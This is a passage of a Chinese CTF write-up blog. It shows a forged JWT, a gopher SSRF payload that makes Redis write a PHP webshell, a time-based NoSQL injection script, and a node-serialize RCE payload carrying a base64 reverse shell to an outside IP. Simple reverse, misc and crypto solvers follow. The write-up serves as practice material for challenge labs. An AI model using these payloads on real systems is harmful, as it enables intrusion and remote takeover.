class="string">&#x27;urll&#x27;</span>];</span><br><span class="line">    var_dump(<span class="variable">$urla</span>);</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="string">&quot;<span class="subst">$urla</span>&quot;</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$result</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>composer.json</code>去下载<code>php-jwt</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;require&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;firebase/php-jwt&quot;</span>: <span class="string">&quot;^5.4&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后伪造<code>JWT</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$fff</span> = fopen(<span class="string">&quot;./rsa_private_key.pem&quot;</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line"><span class="variable">$rsa_private_key</span> = fread(<span class="variable">$fff</span>,filesize(<span class="string">&quot;./rsa_private_key.pem&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span> =&gt; <span class="string">&quot;jw2fdkci2F2md2FFA4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;isadmin&quot;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$jwt</span> = JWT::encode(<span class="variable">$payload</span>,<span class="variable">$rsa_private_key</span>,<span class="string">&quot;RS256&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jwt</span>;</span><br></pre></td></tr></table></figure><p>将伪造的<code>JWT</code>带入<code>cookie</code>，通过源码发现是<code>ssrf</code></p><p>我们用<code>dict://127.0.0.1:6379/info</code>有回显猜测是攻击<code>redis</code>服务</p><p>通过学习学习大佬文章<a href="https://www.cnblogs.com/CoLo/p/14214208.html#dict%E6%89%93redis%E4%B9%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell">https://www.cnblogs.com/CoLo/p/14214208.html#dict%E6%89%93redis%E4%B9%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell</a></p><p>得到如下<code>poc</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /adminfdsa.php HTTP/1.1</span><br><span class="line">Host: eci-2ze1odj66lcwfeyts2hd.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 985</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://eci-2ze0cwaav487mf7p4jpy.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://eci-2ze0cwaav487mf7p4jpy.cloudeci1.ichunqiu.com/adminfdsa.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.9</span><br><span class="line">Cookie: secretcookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJwd2QiOiJqdzJmZGtjaTJGMm1kMkZGQTQiLCJpc2FkbWluIjp0cnVlfQ.YGkZWFa4izQEw8xoDXNM6XwfBbLNrtlhpROqegZTKYQrIAvyo4vZmdVzsbiZ2iqcNjAocDelUrqciJp0AWat7wq61F3dwXLahd0qWG2PyIQ2IP3l2eAyWrbYkBiqIH1RYgkxqufEcGR8QYRkIxPK06G_VjcUISmObpg9wTS53_E; __jsluid_h=dc7eb06b6dbe4278a2d3e5919e8a9e1d</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">urll=gopher://127.0.0.1:6379/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2533%250d%250a%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2537%250d%250a%2563%256d%2564%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2532%2534%250d%250a%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2561%255d%2529%253b%253f%253e%250d%250a%2573%2561%2576%2565%250d%250a</span><br></pre></td></tr></table></figure><p>使用以下工具构造的<code>gopher</code>攻击<code>redis</code>的数据</p><p>工具：<a href="https://github.com/firebroo/sec_tools/tree/master/">https://github.com/firebroo/sec_tools/tree/master/</a></p><p>打过<code>poc</code>后在目录下写入了<code>cmd.php</code>的马，拿蚁剑连接一下，发现需要提权，这里弄了半天，结果把蚁剑的插件更新了一下就可以了，然后运行根目录下的<code>/readflag</code>即可获得<code>flag</code></p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150744.png" alt="image-20220115064835490"></p><h2 id="GrandTravel"><a href="#GrandTravel" class="headerlink" title="GrandTravel"></a>GrandTravel</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zeiqgw6ldv5kgfntkik.cloudeci1.ichunqiu.com:8888/login&quot;</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">128</span>):</span><br><span class="line">        ti = time.time()</span><br><span class="line">        burp0_data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:</span><br><span class="line">            <span class="string">f&quot;admin\&quot;&amp;&amp;this[\&quot;pass\&quot;+\&quot;word\&quot;][<span class="subst">&#123;pos&#125;</span>]&lt;\&quot;<span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span>\&quot;&amp;&amp;sleep(1000)||this[\&quot;user\&quot;+\&quot;name\&quot;]==\&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;login&quot;</span>: <span class="string">&quot;login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        requests.post(url, data=burp0_data)</span><br><span class="line">        tim = time.time()</span><br><span class="line">        <span class="comment"># burp0_data = &#123;&quot;username&quot;: f&quot;admin\&quot;&amp;&amp;this[\&quot;pass\&quot;+\&quot;word\&quot;][&#123;pos&#125;]&gt;\&quot;&#123;chr(mid)&#125;\&quot;&amp;&amp;sleep(1000)||this[\&quot;user\&quot;+\&quot;name\&quot;]==\&quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span></span><br><span class="line">        <span class="keyword">if</span> (tim - ti &gt; <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(burp0_data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line">            username += <span class="built_in">chr</span>(mid - <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(username)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Adm1n_P0ssw0rd_a1w6346daw94d</span></span><br><span class="line"><span class="comment"># 124.89.2.70</span></span><br></pre></td></tr></table></figure><p>注入后得到密码<code>Adm1n_P0ssw0rd_a1w6346daw94d</code></p><p>首页<code>ip</code>：<code>124.89.2.70</code></p><p>在<code>users.js</code>文件中我们可以看到如下</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150745.png" alt="image-20220116020726030"></p><p>存在**node-serialize反序列化RCE漏洞(CVE-2017-5941)**<a href="https://threezh1.com/2020/01/30/NodeJsVulns/#node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E-CVE-2017-5941">https://threezh1.com/2020/01/30/NodeJsVulns/#node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E-CVE-2017-5941</a></p><p>我们来构造<code>payload</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> <span class="attr">rce</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;echo 反弹shell的base64编码|base64 -d|bash -i&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;序列化生成的 Payload: \n&quot;</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure><p>生成后记得在后面加上<strong>括号</strong>，然后我们需要把这个反序列化字符串经过<code>base64编码</code>后写入，这里需要用到<code>ssrf</code>攻击<code>redis</code></p><p>这里是我生成的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;rce&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTcuMTc0LjIyNi85OTk5IDA+JjE=|base64 -d|bash -i&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>查看源码<code>admin.js</code>中可知<code>/admin/download</code>可以实现<code>ssrf</code>攻击<code>redis</code>，但是限制了只能使用<code>http(s)</code>协议，这里用到了<code>CRLF</code>进行攻击，这里不同的是<code>nodejs</code>为了防止<code>CRLF</code>不能使用传统的<code>%0D%0A</code></p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150746.png" alt="image-20220116020226135"></p><p>然后构造<code>payload</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line"><span class="variable">$4</span></span><br><span class="line">AUTH</span><br><span class="line"><span class="variable">$31</span></span><br><span class="line">Red1S_P0ssw0rd_a456wd4654aw54wd</span><br><span class="line">*1</span><br><span class="line"><span class="variable">$7</span></span><br><span class="line">COMMAND</span><br><span class="line">*3</span><br><span class="line"><span class="variable">$3</span></span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="variable">$37</span></span><br><span class="line">admin9c96b0e1f2f329d1f0de426574e584da</span><br><span class="line"><span class="variable">$276</span></span><br><span class="line">payload</span><br></pre></td></tr></table></figure><p>上面的<code>admin9c96b0e1f2f329d1f0de426574e584da</code>是由<code>admin + md5(ip)</code>组成，源码中有提到</p><p>根据上一道题攻击<code>redis</code>的内容我们可以构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0:6379/%C4%8DHTTP/1.1%C4%8D%C4%8A*2%C4%8D%C4%8A$4%C4%8D%C4%8AAUTH%C4%8D%C4%8A$31%C4%8D%C4%8ARed1S_P0ssw0rd_a456wd4654aw54wd%C4%8D%C4%8A*1%C4%8D%C4%8A$7%C4%8D%C4%8ACOMMAND%C4%8D%C4%8A*3%C4%8D%C4%8A$3%C4%8D%C4%8Aset%C4%8D%C4%8A$37%C4%8D%C4%8Aadmin9c96b0e1f2f329d1f0de426574e584da%C4%8D%C4%8A$276%C4%8D%C4%8AeyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnZWNobyBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TWk0eE5UY3VNVGMwTGpJeU5pODVPVGs1SURBK0pqRT18YmFzZTY0IC1kfGJhc2ggLWknLGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycil7Y29uc29sZS5sb2coc3Rkb3V0KX0pO30oKSJ9%C4%8D%C4%8A</span><br></pre></td></tr></table></figure><p>这里需要注意的一点是：如果<code>base64</code>中有<code>+</code>号，我们需要进行<code>url编码</code></p><p>攻击后我们重新访问<code>users/contact</code>页面即可<code>反弹shell</code></p><p>然后根目录有<code>flag</code>，但是需要提权</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150747.png" alt="image-20220116021706068"></p><p>存在<code>ftp</code>，通过<code>ftp服务</code>进行读取文件，使用以下的项目在<code>/tmp</code>运行<code>nodejs ftp</code>服务</p><p><code>nodejs ftp</code>项目地址：<a href="https://github.com/mailsvb/jsftpd">https://github.com/mailsvb/jsftpd</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;const &#123; ftpd &#125; = require(&#x27;jsftpd&#x27;)\nconst server = new ftpd(&#123;cnf: &#123;username: &#x27;ggbond&#x27;, password: &#x27;ggbond&#x27;, basefolder: &#x27;/tmp&#x27;, port: 4444&#125;&#125;)\nserver.start()&quot;</span>&gt;exp.js</span><br><span class="line">npm i jsftpd</span><br><span class="line">node exp.js</span><br></pre></td></tr></table></figure><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150748.png" alt="image-20220116015636153"></p><p>在反弹一个<code>shell</code>，在<code>/tmp</code>进行连接，然后<code>put</code>就好</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150749.png" alt="image-20220116015706388"></p><p>这里不能直接使用靶机连接<code>vps</code>的<code>ftp</code>服务，因为处在内网，使用被动模式的<code>ftp连接</code>无法下载文件。</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Lihua’s-for"><a href="#Lihua’s-for" class="headerlink" title="Lihua’s for"></a>Lihua’s for</h2><p>源码比较简单，就是个异或，找到字符串进行反异或</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150750.png" alt="image-20220114143102803"></p><p> exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;fmcd\x7Fd26jl&gt;=9 o: w?&#x27;%&#x27;\x22:z.xz1/))\x16@DE\x12GGA\x1AT&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(a[i])), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>直接进行反编译没有成功，查看文件结构，通过学习结构进行修改</p><p><a href="https://www.cnblogs.com/blili/p/11799483.html">https://www.cnblogs.com/blili/p/11799483.html</a></p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150751.png" alt="r"></p><p>然后就可以找个在线网站直接反编译，或者使用<a href="https://github.com/aliansi/Easy-Python-Decompiler-v1.3.2">https://github.com/aliansi/Easy-Python-Decompiler-v1.3.2</a></p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150752.png" alt="image-20220115000607198"></p><p>得源码，直接上<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">tmp = [</span><br><span class="line">    <span class="number">100</span>, <span class="number">5</span>, <span class="number">87</span>, <span class="number">2</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">84</span>, <span class="number">80</span>, <span class="number">2</span>, <span class="number">87</span>, <span class="number">80</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">85</span>, <span class="number">87</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">87</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">84</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">81</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">13</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">enc, length</span>):</span></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            enc[i + length] ^= enc[i]</span><br><span class="line">        <span class="keyword">return</span> decode(enc, length &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decode(tmp, <span class="number">1</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{study_hard_and_make_progress_every_day}</p><h2 id="qrcode"><a href="#qrcode" class="headerlink" title="qrcode"></a>qrcode</h2><p>一共16张图片，4*4直接手动拼图</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150753.png" alt="image-20220114133931814"></p><p>flag{b9f32f7f-f30c-408f-b0bd-64c03a60e915}</p><h2 id="你悟了吗"><a href="#你悟了吗" class="headerlink" title="你悟了吗"></a>你悟了吗</h2><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toBaGua</span>(<span class="params">strArr</span>):</span></span><br><span class="line">    code = &#123;</span><br><span class="line">        <span class="string">&#x27;乾&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,  <span class="comment"># 乾</span></span><br><span class="line">        <span class="string">&#x27;兑&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,  <span class="comment"># 兑</span></span><br><span class="line">        <span class="string">&#x27;离&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,  <span class="comment"># 离</span></span><br><span class="line">        <span class="string">&#x27;震&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,  <span class="comment"># 震</span></span><br><span class="line">        <span class="string">&#x27;巽&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,  <span class="comment"># 巽</span></span><br><span class="line">        <span class="string">&#x27;坎&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,  <span class="comment"># 坎</span></span><br><span class="line">        <span class="string">&#x27;艮&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,  <span class="comment"># 艮</span></span><br><span class="line">        <span class="string">&#x27;坤&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,  <span class="comment"># 坤</span></span><br><span class="line">    &#125;</span><br><span class="line">    returnStr = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 返回八卦符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> strArr:</span><br><span class="line">        returnStr += <span class="built_in">str</span>(<span class="built_in">int</span>(code[b], <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> returnStr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;震兑巽艮艮兑巽兑震兑艮坤坎坎巽兑震乾离震震坎巽震震兑离震巽兑巽艮兑坎艮离艮巽坤兑震乾艮震离巽坤乾兑震离震离乾艮艮兑坎乾震巽巽坎坎震乾离震震巽艮震兑坎乾离艮巽艮离兑坎巽震乾兑巽离兑巽艮艮兑兑巽巽震乾艮震兑巽艮坎震乾艮震震坎坤坎&quot;</span></span><br><span class="line">flag_int = toBaGua(string)</span><br><span class="line"><span class="built_in">print</span>(flag_int)</span><br></pre></td></tr></table></figure><p>输出的数字进行十六进制解密就好</p><h2 id="BrokenPassword"><a href="#BrokenPassword" class="headerlink" title="BrokenPassword"></a>BrokenPassword</h2><p>压缩包解密，没想到用工具直接就字典爆破了出来</p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150754.png" alt="image-20220115000918577"></p><h2 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h2><p>再<code>kali</code>上使用<code>steghide</code>查看隐藏信息，发现有<code>flag</code></p><p><img src="/post/2022-01/2022%E5%B7%A5%E5%A4%A7%E6%8A%97%E7%96%AB/202201162150755.png" alt="image-20220115001541998"></p><p>直接就读了出来</p><h2 id="i-am-scriptkids"><a href="#i-am-scriptkids" class="headerlink" title="i_am_scriptkids"></a>i_am_scriptkids</h2><p>很大的一个<code>base</code>加密字符串，进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">open</span>(<span class="string">&#x27;./base/base.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./base/1&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">tmp = base64.b32decode(base)</span><br><span class="line"></span><br><span class="line">file.write(tmp)</span><br></pre></td></tr></table></figure><p>手动修改，解了有30次好像，分别都有<code>base16</code>、<code>base32</code>、<code>base64</code>、<code>base85</code></p><p>flag{90672c52-200d-11ec-bdc8-33c511816e47}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="simpleCrypto"><a href="#simpleCrypto" class="headerlink" title="simpleCrypto"></a>simpleCrypto</h2><p> 维基尼亚解密： <a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><p>得到密码为：<code>zheshimima</code>，解压就是flag</p><h2 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2, sympy</span><br><span class="line"></span><br><span class="line">n = <span class="number">96722669749951212913756678234358651184134068407812470434435916603156818917545841439779031943800634250032106764154804309935557678512858630048212204696471487762160744924838010746445510979202735123140536599975731157563069594497905809587369126155476201977830809090473053692189364335223367147692962090288185113654598050169422517553085833257142179937154768657039042632343562454149914801329414293361879935460883633117988279426277638667508115319494914342600199690237441851088350726869553691992122821267990343643644523989413546160765907845604067031798179773495433134648132709349683621175243064236059479837244518879574919017301667066698329442453248971033564328161407342561250703168154214939772631586519304164853651</span></span><br><span class="line">c1 = <span 